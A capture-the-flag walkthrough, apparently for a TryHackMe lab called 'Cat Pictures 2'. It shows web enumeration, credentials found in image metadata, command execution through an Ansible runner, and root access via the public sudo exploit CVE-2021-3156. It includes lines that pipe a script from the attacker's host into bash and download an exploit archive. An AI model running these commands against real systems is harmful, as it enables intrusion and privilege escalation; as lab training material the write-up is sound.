<div align="center">

<img src="https://cdn-images.tryhackme.com/room-icons/4c424fa649d64938ae8282b14e4299ac.png" width="150">

# Cat Pictures 2

**Difficulty:** Easy    
**Category:** Web

</div>

---



## Enumerating port 80

```bash
gobuster dir -u http://10.81.166.213 -w /usr/share/wordlists/dirb/big.txt
```

![temp](assets/20260717082637.png)

**PHP application** 

![temp](assets/20260717082844.png)


![temp](assets/20260717093613.png)

![temp](assets/20260717094220.png)

The first cat picture has the description: "note to self: strip metadata"

I download the image and:
```bash
exiftool blabal.jpg
```

![temp](assets/20260717094437.png)

I go to this URL and:
```text
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

I log into GiTea and find the commit "add flag":

![temp](assets/20260717094620.png)

![temp](assets/20260717094634.png)

```flag
10d916<REDACTED>146bb5
```

This is the ansible repo:

![temp](assets/20260722131418.png)


I found the Ansible tasks which were hinted to in the note (port 1337):

![temp](assets/20260717095102.png)

From the previous note we know that Ansible is on port 1337.

Port1337: (olivetin)

![temp](assets/20260722131506.png)

I can ping host

![temp](assets/20260717095347.png)

I enter my IP and look at tcpdump:

```bash
sudo tcpdump -i eth0
```

![temp](assets/20260717095343.png)

I can see them. RCE?

![temp](assets/20260717095738.png)

Enter the shell ^

![temp](assets/20260722131637.png)

Now we run the playbook

![temp](assets/20260717095800.png)

```bash
cat flag2.txt
5e2cafbbf<REDACTED>cd797920
```

I find the private ssh key and ssh in.

```bash
ssh -i bismuth_id_rsa bismuth@10.81.181.85
```

![temp](assets/20260722131908.png)

Lets run linPEAS

```bash
curl 192.168.135.169:6767/linpeas.sh|bash
```

![temp](assets/20260722133204.png)

https://www.exploit-db.com/exploits/51217

```
The exploit checks if the current user has privileges to run sudoedit or sudo -e on a file as root. If so, it will open the sudoers file for the attacker to ad a line to gain privileges on all the files and get a root shell.
```

This one is better:
https://github.com/blasty/CVE-2021-3156


On my machine:
```bash
git clone https://github.com/blasty/CVE-2021-3156

tar -cvf exploit.tar CVE-2021-3156

python3 -m http.server 6767
```

On target:
```bash
curl 192.168.135.169:6767/exploit.tar -o homework.tar
tar -xopf homework.tar
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
```

![temp](assets/20260722134405.png)

Choose 0:

![temp](assets/20260722134428.png)

```bash
sudo su
```

![temp](assets/20260722134451.png)

hell yeah!

```bash
cat /root/root.txt
6d2a<REDACTED>a28a971
```
